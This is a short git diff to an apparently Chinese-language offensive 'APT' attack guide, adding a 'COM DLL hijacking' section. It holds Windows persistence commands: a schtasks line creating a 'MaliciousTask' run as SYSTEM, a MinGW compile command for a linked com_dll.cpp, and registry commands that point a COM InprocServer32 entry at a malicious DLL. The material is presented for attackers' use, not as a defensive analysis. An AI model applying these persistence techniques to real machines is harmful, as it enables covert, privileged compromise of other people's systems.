@@ -889,3 +889,16 @@ schtasks /create /tn "MaliciousTask" /xml "C:\Path\To\Task.xml" /ru SYSTEM
 ```
 
 [task.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/task.cpp)
+
+### COM DLL劫持
+
+[com_dll.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/com_dll.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 com_dll.cpp -o com_dll.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+```powershell
+Set-ItemProperty -Path "HKCR:\CLSID\{CLSID}\InprocServer32" -Name "(default)" -Value "C:\Path\To\Malicious.dll"
+reg delete "HKCU\Software\Classes\CLSID\{CLSID}" /f
+```
